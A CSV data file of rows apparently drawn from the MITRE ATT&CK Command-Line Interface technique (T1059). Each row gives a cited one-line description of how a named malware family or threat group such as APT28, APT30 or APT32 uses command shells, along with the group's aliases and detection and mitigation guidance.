1000,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0070|HTTPBrowser]] is capable of spawning a reverse shell on a victim.[[CiteRef::Dell TG-3390]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: HTTPBrowser, Token Control, HttpDump",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1001,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0071|hcdLoader]] provides command-line access to the compromised system.[[CiteRef::Dell Lateral Movement]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: hcdLoader,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1002,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0106|cmd]] is used to execute programs and other actions at the command-line interface.[[CiteRef::TechNet Cmd]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: cmd, cmd.exe",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1003,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0124|Pisloader]] uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.[[CiteRef::Palo Alto DNS Requests]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: Pisloader,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1004,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0128|BADNEWS]] is capable of executing commands via cmd.exe.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: BADNEWS,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1005,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0069|BLACKCOFFEE]] has the capability to create a reverse shell.[[CiteRef::FireEye APT17]]'],['APT17'],"['APT17', 'Deputy Dog']",['G0025'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: BLACKCOFFEE,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1006,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0021|Derusbi]] is capable of creating a remote Bash shell and executing commands.[[CiteRef::Fidelis Turbo]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: Derusbi,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1007,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0004|TinyZBot]] supports execution from the command-line.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: TinyZBot,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1008,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['Malware used by [[Group/G0004|Ke3chang]] can run commands on the command-line interface.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1009,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0006|APT1]] has used the Windows command shell to execute commands.[[CiteRef::Mandiant APT1]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1010,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0023|CHOPSTICK]] is capable of performing remote command execution.[[CiteRef::Crowdstrike DNC June 2016]][[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: CHOPSTICK, SPLM, ...",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1011,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0045|ADVSTORESHELL]] can create a remote shell and run a given command.[[CiteRef::ESET Sednit Part 2]][[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: ADVSTORESHELL, NETUI, ...",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1012,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0117|XTunnel]] has been used to execute remote commands.[[CiteRef::Crowdstrike DNC June 2016]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: XTunnel, X-Tunnel, XAPS",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1013,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0148|RTM]] uses the command line and rundll32.exe to execute.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: RTM,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1014,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0077|CallMe]] has the capability to create a reverse shell on victims.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: CallMe,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1015,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0013|PlugX]] allows actors to spawn a reverse shell on a victim.[[CiteRef::Dell TG-3390]]'],['DragonOK'],['DragonOK'],['G0017'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: PlugX, Sogu, Kaba",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1016,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0082|Emissary]] has the capability to create a remote shell and execute specified commands.[[CiteRef::Lotus Blossom Dec 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: Emissary,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1017,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0028|Threat Group-1314]] actors spawned shells on remote systems on a victim network to execute commands.[[CiteRef::Dell TG-1314]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1018,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']","['Adversaries can direct [[Software/S0031|BACKSPACE]] to execute from the command-line on infected hosts, or have [[Software/S0031|BACKSPACE]] create a reverse shell.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: BACKSPACE, Lecna",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1019,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0034|NETEAGLE]] allows adversaries to execute shell commands on the infected host.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: NETEAGLE,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1020,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']","['Following exploitation with [[Software/S0042|LOWBALL]] malware, [[Group/G0018|admin@338]] actors created a file containing a list of commands to be executed on the compromised computer.[[CiteRef::FireEye admin@338]]']",['admin@338'],['admin@338'],['G0018'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1021,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['Several tools used by [[Group/G0039|Suckfly]] have been command-line driven.[[CiteRef::Symantec Suckfly May 2016]]'],['Suckfly'],['Suckfly'],['G0039'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1022,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0156|KOMPROGO]] is capable of creating a reverse shell.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: KOMPROGO,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1023,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0158|PHOREAL]] is capable of creating reverse shell.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: PHOREAL,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1024,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0083|Misdat]] is capable of providing shell functionality to the attacker to execute commands.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: Misdat,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1025,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0084|Mis-Type]] uses cmd.exe to run commands for enumerating the host.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: Mis-Type,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
